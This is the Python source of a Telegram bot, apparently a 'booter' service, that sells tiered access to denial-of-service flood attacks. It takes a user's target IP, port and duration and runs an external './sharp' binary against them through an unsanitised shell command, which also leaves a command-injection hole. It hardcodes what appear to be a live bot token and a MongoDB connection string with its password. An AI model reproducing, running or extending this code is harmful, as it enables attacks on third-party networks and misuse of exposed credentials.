import os
import telebot
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread
import subprocess
import signal

# ========== CONFIGURATION ==========
TOKEN = '7724010740:AAHl1Avs1FDKlfvTjABS3ffe6-nVhkcGCj0'
ADMIN_IDS = [8167507955]  # Admin user IDs
OWNER_USERNAME = "@seedhe_maut_bot"
MONGO_URI = 'mongodb+srv://zeni:1I8uJt78Abh4K5lo@zeni.v7yls.mongodb.net/?retryWrites=true&w=majority&appName=zeni'
CHANNEL_ID = -1002512368825
BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]
# ===================================

# Initialize logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)

# Database setup
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

# Bot initialization
bot = telebot.TeleBot(TOKEN)

# Global attack manager
class AttackManager:
    def __init__(self):
        self.active_attacks = {}  # {user_id: {pid: process}}
        self.lock = asyncio.Lock()

    async def start_attack(self, user_id, target_ip, target_port, duration):
        try:
            if target_port in BLOCKED_PORTS:
                raise ValueError(f"Port {target_port} is blocked")

            # Start the attack process
            cmd = f"./sharp {target_ip} {target_port} {duration}"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            async with self.lock:
                if user_id not in self.active_attacks:
                    self.active_attacks[user_id] = {}
                self.active_attacks[user_id][process.pid] = process

            # Wait for process to complete
            stdout, stderr = await process.communicate()
            
            # Clean up
            async with self.lock:
                if user_id in self.active_attacks and process.pid in self.active_attacks[user_id]:
                    del self.active_attacks[user_id][process.pid]
                    if not self.active_attacks[user_id]:
                        del self.active_attacks[user_id]

            return True
        except Exception as e:
            logging.error(f"Attack error: {e}")
            return False

    async def stop_user_attacks(self, user_id):
        stopped = 0
        async with self.lock:
            if user_id in self.active_attacks:
                for pid, process in list(self.active_attacks[user_id].items()):
                    try:
                        process.terminate()
                        await process.wait()
                        stopped += 1
                    except Exception as e:
                        logging.error(f"Error stopping process {pid}: {e}")
                del self.active_attacks[user_id]
        return stopped

    async def stop_all_attacks(self):
        stopped = 0
        async with self.lock:
            for user_id in list(self.active_attacks.keys()):
                stopped += await self.stop_user_attacks(user_id)
        return stopped

# Initialize attack manager
attack_manager = AttackManager()

# Helper functions
def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_approved(user_id):
    user = users_collection.find_one({"user_id": user_id})
    return user and user.get('plan', 0) > 0

def get_user_plan(user_id):
    user = users_collection.find_one({"user_id": user_id})
    return user.get('plan', 0) if user else 0

# Command handlers
@bot.message_handler(commands=['start'])
def start(message):
    """Main menu with buttons"""
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        KeyboardButton("🌊 FLOOD START"),
        KeyboardButton("🛑 STOP ATTACK"),
        KeyboardButton("👤 MY ACCOUNT"),
        KeyboardButton("🛡️ ADMIN")
    )
    bot.send_message(
        message.chat.id,
        f"*🚀 FLOOD BOT*\nOwner: {OWNER_USERNAME}\n\n"
        "Select an option below:",
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['approve', 'disapprove'])
def handle_approval(message):
    """Admin commands for user management"""
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only command", parse_mode='Markdown')
        return

    try:
        parts = message.text.split()
        if len(parts) < 2:
            raise ValueError("Invalid format. Use:\n"
                           "/approve USER_ID PLAN DAYS\n"
                           "/disapprove USER_ID")

        target_id = int(parts[1])
        
        if parts[0] == '/approve':
            if len(parts) < 4:
                raise ValueError("Need plan and days")
            plan = int(parts[2])
            days = int(parts[3])
            
            # Plan limits
            if plan == 1 and users_collection.count_documents({"plan": 1}) >= 99:
                raise ValueError("Plan 1 limit reached (99 users)")
            if plan == 2 and users_collection.count_documents({"plan": 2}) >= 499:
                raise ValueError("Plan 2 limit reached (499 users)")

            expiry = datetime.now() + timedelta(days=days)
            users_collection.update_one(
                {"user_id": target_id},
                {"$set": {
                    "plan": plan,
                    "valid_until": expiry.isoformat(),
                    "access_count": 0
                }},
                upsert=True
            )
            bot.reply_to(message, 
                        f"✅ Approved user {target_id}\n"
                        f"Plan: {plan}\n"
                        f"Days: {days}",
                        parse_mode='Markdown')
            
        elif parts[0] == '/disapprove':
            users_collection.update_one(
                {"user_id": target_id},
                {"$set": {"plan": 0, "valid_until": ""}}
            )
            bot.reply_to(message, f"❌ Disapproved user {target_id}", parse_mode='Markdown')
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text == "🌊 FLOOD START")
def flood_start(message):
    """Initiate flood attack"""
    if not is_approved(message.from_user.id):
        bot.reply_to(message, 
                    "❌ You're not approved\n"
                    "Contact admin for access",
                    parse_mode='Markdown')
        return
        
    bot.reply_to(message, 
                "Enter attack parameters:\n"
                "<IP> <PORT> <TIME in seconds>\n\n"
                "Example: 1.1.1.1 80 60",
                parse_mode='Markdown')
    bot.register_next_step_handler(message, process_flood)

def process_flood(message):
    """Process flood parameters"""
    try:
        parts = message.text.split()
        if len(parts) != 3:
            raise ValueError("Need exactly 3 parameters (IP PORT TIME)")
            
        ip = parts[0]
        port = int(parts[1])
        time_ = parts[2]
        
        # Validate port
        if port in BLOCKED_PORTS:
            raise ValueError(f"Port {port} is blocked")
            
        # Check user plan limits
        user_plan = get_user_plan(message.from_user.id)
        if user_plan == 1 and int(time_) > 120:
            raise ValueError("Plan 1 max time is 120 seconds")
        elif user_plan == 2 and int(time_) > 300:
            raise ValueError("Plan 2 max time is 300 seconds")
            
        # Launch attack
        asyncio.run_coroutine_threadsafe(
            attack_manager.start_attack(message.from_user.id, ip, port, time_),
            loop
        )
        
        bot.reply_to(message,
            f"⚡ Attack launched successfully!\n\n"
            f"Target: {ip}:{port}\n"
            f"Duration: {time_} seconds\n\n"
            f"Use '🛑 STOP ATTACK' to cancel",
            parse_mode='Markdown'
        )
    except ValueError as e:
        bot.reply_to(message, f"❌ Invalid input: {str(e)}", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text == "🛑 STOP ATTACK")
def stop_attack(message):
    """Stop user's attacks"""
    try:
        stopped = asyncio.run_coroutine_threadsafe(
            attack_manager.stop_user_attacks(message.from_user.id),
            loop
        ).result()
        
        if stopped > 0:
            bot.reply_to(message, f"🛑 Stopped {stopped} active attacks", parse_mode='Markdown')
        else:
            bot.reply_to(message, "⚠️ No active attacks found", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text == "👤 MY ACCOUNT")
def account_info(message):
    """Show user account status"""
    user = users_collection.find_one({"user_id": message.from_user.id})
    if user:
        status = "✅ Approved" if user.get('plan', 0) > 0 else "❌ Not approved"
        plan_name = {1: "Basic", 2: "Premium"}.get(user.get('plan', 0), "None")
        
        response = (
            f"*ACCOUNT INFORMATION*\n\n"
            f"🆔 User ID: `{message.from_user.id}`\n"
            f"👤 Username: @{message.from_user.username or 'N/A'}\n"
            f"📊 Plan: {plan_name} ({user.get('plan', 0)})\n"
            f"⏳ Valid until: {user.get('valid_until', 'N/A')}\n"
            f"🔒 Status: {status}"
        )
    else:
        response = "❌ No account found. Contact admin for access."
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text == "🛡️ ADMIN")
def admin_contact(message):
    """Show admin contact"""
    bot.reply_to(message, 
                f"🛡️ *Admin Contact*\n\n"
                f"For approvals or support:\n"
                f"{OWNER_USERNAME}",
                parse_mode='Markdown')

# Admin-only commands
@bot.message_handler(commands=['stopall'])
def admin_stop_all(message):
    """Admin command to stop all attacks"""
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only command", parse_mode='Markdown')
        return
        
    try:
        stopped = asyncio.run_coroutine_threadsafe(
            attack_manager.stop_all_attacks(),
            loop
        ).result()
        bot.reply_to(message, f"🛑 Stopped all attacks ({stopped} total)", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode='Markdown')

# ========== MAIN EXECUTION ==========
def run_bot():
    """Main bot running function"""
    logging.info("Starting bot...")
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            logging.error(f"Polling error: {e}")
            time.sleep(10)

if __name__ == "__main__":
    # Initialize asyncio loop
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    # Start bot in separate thread
    bot_thread = Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Run asyncio loop in main thread
    try:
        loop.run_forever()
    except KeyboardInterrupt:
        logging.info("Shutting down...")
        # Clean up all attacks on shutdown
        asyncio.run_coroutine_threadsafe(attack_manager.stop_all_attacks(), loop).result()
    finally:
        loop.close()
